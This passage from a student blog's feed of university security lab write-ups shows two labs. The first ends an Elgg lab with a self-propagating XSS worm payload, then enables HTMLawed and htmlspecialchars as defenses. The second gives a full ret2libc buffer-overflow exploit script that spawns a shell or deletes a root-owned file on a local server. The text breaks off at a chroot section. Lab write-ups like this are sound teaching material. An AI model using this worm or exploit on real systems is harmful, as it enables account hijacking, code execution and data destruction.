http://www.xsslabelgg.com</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Cookie: Elgg=jl5l97kq1k4todunjgn0ek8ft0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">__elgg_ts=1718938378&amp;__elgg_token=P-0B7cbe_msL5vOGF0n8AQ&amp;guid=44&amp;briefdescription=Samy is my hero&amp;description=&lt;script id=&#x27;worm&#x27;&gt;  </span><br><span class="line">    setTimeout(() =&gt; &#123;  </span><br><span class="line">        var ts = elgg.security.token.__elgg_ts;  </span><br><span class="line">        var token = elgg.security.token.__elgg_token;  </span><br><span class="line">        var guid = elgg.session.user.guid;  </span><br><span class="line">        fetch(&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;, &#123;  </span><br><span class="line">            credentials: &#x27;include&#x27;,  </span><br><span class="line">            method: &#x27;POST&#x27;,  </span><br><span class="line">            headers: &#123;  </span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            body: new URLSearchParams(&#123;  </span><br><span class="line">                __elgg_ts: ts,  </span><br><span class="line">                __elgg_token: token,  </span><br><span class="line">                guid: guid,  </span><br><span class="line">                briefdescription: &quot;Samy is my hero&quot;,  </span><br><span class="line">                description: &quot;&lt;script id=&#x27;worm&#x27;&gt;&quot; + document.getElementById(&#x27;worm&#x27;).innerHTML + &quot;&lt;\/script&gt;&quot;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;, 3000)  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">POST: HTTP/1.1 302 Found</span><br><span class="line">Date: Fri, 21 Jun 2024 02:53:01 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: http://www.xsslabelgg.com/profile/alice</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=5, max=97</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br></pre></td></tr></table></figure><p>Log in as Boby and access Alice’s profile, can also get the POST packet modifying the profile and Boby’s introduction was also modified to the same sentence:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111233972.png" alt="image-20240621111233972"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111431159.png" alt="image-20240621111431159"></p><h3 id="Task-4-Defense-Strategy-1"><a href="#Task-4-Defense-Strategy-1" class="headerlink" title="Task 4: Defense Strategy"></a><strong>Task 4: Defense Strategy</strong></h3><h4 id="Only-Enable-HTMLawed-1-9"><a href="#Only-Enable-HTMLawed-1-9" class="headerlink" title="Only Enable HTMLawed 1.9"></a>Only Enable HTMLawed 1.9</h4><p>Elgg has default defense strategies. The virtual machine has disabled and commented out the corresponding defense strategies. In fact, the Elgg web application originally enables a customized security plugin HTMLawed, which validates user input and removes tags from the input. This specific plugin is registered to the filter tags function in the elgg&#x2F;engine&#x2F;lib&#x2F;input.php file. For example, it converts tags like <script> to <p> so that JavaScript scripts cannot be executed.</p><p>Go to Account→administration (top menu)→plugins (on the right panel), then select security and spam from the dropdown menu and click filter. Find the HTMLawed 1.8 plugin below. Click Activate to enable the strategy.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120050952.png" alt="image-20240621120050952"></p><p>Visit Samy&#39;s homepage again and try to modify, found that script tags were converted to p tags, the inserted js statement format was converted and cannot be executed.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120305885.png" alt="image-20240621120305885"></p><h4 id="Enable-HTMLawed-1-9-and-htmlspecialchars"><a href="#Enable-HTMLawed-1-9-and-htmlspecialchars" class="headerlink" title="Enable HTMLawed 1.9 and htmlspecialchars"></a>Enable HTMLawed 1.9 and htmlspecialchars</h4><p>The <code>htmlspecialchars</code> function converts the following special characters to corresponding HTML entities:</p><ul><li><code>&amp;</code> converts to &amp;amp;</li><li><code>&lt;</code> converts to &amp;lt;</li><li><code>&gt;</code> converts to &amp;gt;</li><li><code>&quot;</code> converts to &amp;quot;</li><li><code>&#39;</code> converts to &amp;#039;</li></ul><p>We enter the directory <code>/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</code> as superuser in the virtual machine, use vim to enter the files that call the <code>htmlspecialchars()</code> function: text.php, url.php, dropdown.php, email.php. In each file, uncomment the corresponding <code>htmlspecialchars()</code> function call. The commands used are as follows:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo su </span><br><span class="line">cd /var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</span><br><span class="line">vim text.php </span><br><span class="line">vim url.php </span><br><span class="line">vim dropdown.php </span><br><span class="line">vim email.php </span><br></pre></td></tr></table></figure><p>text.php:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121244426.png" alt="image-20240621121244426"></p><p>url.php</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121416527.png" alt="image-20240621121416527"></p><p>dropdown.php</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121450425.png" alt="image-20240621121450425"></p><p>email.php</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121538048.png" alt="image-20240621121538048"></p><p>Visit Samy&#39;s homepage, found that some special symbols have been converted to entity symbols, js statements cannot be executed:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621123332775.png" alt="image-20240621123332775"></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab2-System Security</title>
      <link href="/2024/09/26/HUST%20Information%20System%20Security%20Lab2-System%20Security/"/>
      <url>/2024/09/26/HUST%20Information%20System%20Security%20Lab2-System%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="Information-System-Security-Lab2-Record"><a href="#Information-System-Security-Lab2-Record" class="headerlink" title="Information System Security Lab2 Record"></a>Information System Security Lab2 Record</h1><h2 id="Exploit-vulnerable-processes-of-web-server-to-obtain-shell-or-delete-root-privilege-file-tmp-test"><a href="#Exploit-vulnerable-processes-of-web-server-to-obtain-shell-or-delete-root-privilege-file-tmp-test" class="headerlink" title="Exploit vulnerable processes of web server to obtain shell (or delete root privilege file &#x2F;tmp&#x2F;test)"></a>Exploit vulnerable processes of web server to obtain shell (or delete root privilege file &#x2F;tmp&#x2F;test)</h2><h3 id="Experiment-Environment-Configuration"><a href="#Experiment-Environment-Configuration" class="headerlink" title="Experiment Environment Configuration"></a>Experiment Environment Configuration</h3><p>First, the experiment environment needs to be configured. Specifically, need to disable ASLR, then compile the target program, set privileges for touchstone and start the server.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">sudo make</span><br><span class="line">sudo chown root touchstone</span><br><span class="line">sudo chmod +s touchstone</span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105024424.png" alt="Process information after server startup"></p><p>Then use a browser to enter 127.0.0.1:80 to access the server interface, input username: lixiang and password: 123456 to register.</p><h3 id="Perform-exploit-attack"><a href="#Perform-exploit-attack" class="headerlink" title="Perform exploit attack"></a>Perform exploit attack</h3><p>First, use ldd to view the base address information of libc.so.6 loading as <strong><code>0xf7d9d000</code></strong>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd banksv</span><br></pre></td></tr></table></figure><p><img src="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240619110810753.png" alt="image-20240619110810753"></p><p>Use ropper to view the offset address of “&#x2F;bin&#x2F;bash” string relative to the base address as <strong><code>0x0018e363</code></strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619110952993.png" alt="image-20240619110952993"></p><p>Use readelf to view the addresses of system, exit, unlink functions as <code>0x00041780</code>, <code>0x000340c0</code>, <code>0x0004f4100</code> respectively.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; unlink&quot; </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112513036.png" alt="image-20240619112513036"></p><p>Then according to the server logs, we can see the ebp address as <code>0xffffd218</code>.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112956513.png" alt="image-20240619112956513"></p><p>Need to locate the vulnerability point getToken function.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619123342290.png" alt="image-20240619123342290"></p><p>The function uses a fixed-size character array <code>s[1024]</code>, but doesn’t check if <code>i</code> exceeds the array bounds. When the number of characters read exceeds 1024, a buffer overflow occurs, which is a stack overflow, then attacks can be implemented by overwriting the return address.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    s[i++] = c;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Modify the exploit-template.py script, replace the addresses with the above addresses. type1 is used to obtain shell, type2 is used to delete files. But first need to know what the vulnerability is.</p><p>To find the overflow position, we must find the distance between the position storing the return address in the getToken() stack frame and the buffer s. Since the buffer variable s has a length of 1024, this length must be greater than 1024. Use the following code for probing:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req += b&#x27;A&#x27; * 1024 + cyclic(200)</span><br></pre></td></tr></table></figure><p>Run with python3 to get the following output.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit1.py 2 </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619124023743.png" alt="image-20240619124023743"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg</span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/80/v2-411d49bcdf3fe49ec2980dce39fe9808_720w.png" alt="image-20240619124114951"></p><p>This is the kernel output log. We can see the return address was overwritten to 0x6161616c, which actually corresponds to “laaa”, then calculate the offset as 44, so 1024 + 44 &#x3D; 1068 can overwrite the return address.</p><ul><li><p>Obtain shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125150850.png" alt="image-20240619125150850"></p><p>The result is as shown above, the addresses are system function, exit function, “&#x2F;bin&#x2F;sh” address in order, which matches the stack structure we want to construct.</p></li><li><p>Delete file</p><p>Next, test deleting &#x2F;tmp&#x2F;test.txt. First create &#x2F;tmp&#x2F;test.txt and change its owner to root.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt</span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125710551.png" alt="image-20240619125710551"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125937003.png" alt="image-20240619125937003"></p></li></ul><p>The attack Python script is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> traceback  </span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> os.path  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># libc base address  </span></span><br><span class="line"><span class="comment"># ASLR shoud be off, so that libc&#x27;s base address will not change untill next reboot   </span></span><br><span class="line"><span class="comment"># you can use &quot;ldd ./program&quot; to check the libc base address  </span></span><br><span class="line">base_addr = <span class="number">0xf7d9d000</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># all of the offsets of functions (strings) inside libc vary little (sometimes change, previews check is needed) .  </span></span><br><span class="line"><span class="comment"># to get the offset of a funtion, you can use:  </span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span></span><br><span class="line"><span class="comment"># to get &quot;/bin/sh&quot;:  </span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># system  </span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span></span><br><span class="line"><span class="comment"># /bin/sh  </span></span><br><span class="line">sh_addr = base_addr + <span class="number">0x0018e363</span> </span><br><span class="line"><span class="comment"># exit  </span></span><br><span class="line">ex_addr = base_addr + <span class="number">0x000340c0</span> </span><br><span class="line"><span class="comment"># unlink  </span></span><br><span class="line">ul_addr = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># dead  </span></span><br><span class="line">d_addr = <span class="number">0xdeadbeef</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ebp  too make the task simple, we print ebp of getToken function (vulnerable)   </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">## Below is the function that you should modify to construct an  </span></span><br><span class="line"><span class="comment">## HTTP request that will cause a buffer overflow in some part  </span></span><br><span class="line"><span class="comment">## of the vulnerable web server and exploit it.  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode, <span class="built_in">type</span></span>):  </span><br><span class="line">  </span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span>  </span><br><span class="line">    ul_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span>  </span><br><span class="line">    sys_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># All of the header information other than &quot;Content-Length&quot; is not important  </span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># The Content-Length below is useful, and depends on the length of   </span></span><br><span class="line">    <span class="comment"># username plus password, you need to use wireshark (together with web browser)   </span></span><br><span class="line">    <span class="comment"># for checking the length  </span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)   </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># For different oses (and compilation), the length of fillup for   </span></span><br><span class="line">    <span class="comment"># hijacking the return address in the stack, could be different,  </span></span><br><span class="line">    <span class="comment"># therefore you need to debug the program for checking and adjusting.  </span></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    <span class="comment"># b&#x27;C&#x27; * 4  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># use &quot;/bin/sh&quot; string in libc  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:  </span><br><span class="line">        req += p32(sys_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(sh_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># put &quot;/bin/sh&quot; string in the stack  </span></span><br><span class="line">    <span class="comment"># ebp is needed to locate the place of string   </span></span><br><span class="line">    <span class="comment"># Note: using this method, you can put arbitrary string in the stack,   </span></span><br><span class="line">    <span class="comment"># so that &quot;system&quot; can execute arbitrary command  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(ex_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_arg_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(0)  </span></span><br><span class="line">    <span class="comment">#req += sys_arg.encode(&#x27;latin-1&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># remove a file specified by the path &quot;ul_arg&quot;  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:  </span><br><span class="line">        req += p32(ul_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(ul_arg_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">        req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">     </span><br><span class="line">    <span class="comment"># Below is the username/password that you can Register into the web server  </span></span><br><span class="line">    <span class="comment"># by using web browser. These information will be stored into the sqlite db behind.  </span></span><br><span class="line">    <span class="comment"># You need to change these information according to your own registration.  </span></span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Note that successful POST will be responded by the server with a hint page.  </span></span><br><span class="line">    <span class="comment"># By using the successful response, you can judge whether the server has been   </span></span><br><span class="line">    <span class="comment"># crashed (by exploit), so that you can adjust the fillup accordingly.  </span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">    <span class="keyword">return</span> req  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">#If you cannot use p32 (in pwnlib), you can use the following line  </span></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):  </span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))  </span><br><span class="line">    sock.connect((host, port))  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)  </span><br><span class="line">    sock.send(req)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)  </span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):  </span><br><span class="line">      resp = resp+rbuf  </span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)  </span><br><span class="line">    sock.close()  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; type&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;type: 1 for shell, 2 for unlink&quot;</span>)  </span><br><span class="line">    exit()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    req = build_exploit(shellcode, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">  </span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(resp)  </span><br><span class="line"><span class="keyword">except</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Problems-Encountered"><a href="#Problems-Encountered" class="headerlink" title="Problems Encountered"></a>Problems Encountered</h3><ol><li><p>When the server process ends and restarts, socket binding failure often occurs because port 80 is occupied. Port 80 is the default port of Apache server, so this problem can be solved by modifying Apache’s default port to 8080.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su  </span><br><span class="line">systemctl disable apache2  </span><br><span class="line">vim /etc/apache2/ports.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change Listen 80... to: Listen 8080</span></span><br><span class="line">vim /etc/apache2/sites-available/000-default.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change &lt;VirtualHost *:80&gt;... to: &lt;VirtualHost *:8080&gt;</span></span><br><span class="line">systemctl restart apache2  </span><br></pre></td></tr></table></figure></li></ol><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105721675.png" alt="Image when Apache service listening port modification is successful"></p><ol start="2"><li><p>I found that the ebp value changed when executing touchstone through setuid and sudo in these two different ways.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./touchstone</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162514457.png" alt="image-20240619162514457"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162549093.png" alt="image-20240619162549093"></p><p>AI Answer: <code>setuid</code> and <code>sudo</code> provide different privilege escalation mechanisms. <code>setuid</code> runs the executable file with the file owner’s privileges by setting the executable file’s permissions, while <code>sudo</code> allows authorized users to temporarily elevate privileges to execute specific commands. The change in <code>ebp</code> value may be caused by different execution environments and security mechanisms, especially when involving privilege escalation.</p></li></ol><h2 id="Use-chroot-to-constrain-web-server-perform-exploit-delete-root-privilege-file-tmp-test"><a href="#Use-chroot-to-constrain-web-server-perform-exploit-delete-root-privilege-file-tmp-test" class="headerlink" title="Use chroot to constrain web server, perform exploit, delete root privilege file &#x2F;tmp&#x2F;test"></a>Use chroot to constrain web server, perform exploit, delete root privilege file &#x2F;tmp&#x2F;test</h2><h3 id="Experiment-Environment-Configuration-1"><a href="#Experiment-Environment-Configuration-1" class="headerlink" title="Experiment Environment Configuration"></a>Experiment Environment Configuration</h3><p>To avoid affecting the previous experiment’s results, copy the code directory to code_chroot. Of course, still need to disable address randomization to avoid address changes.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 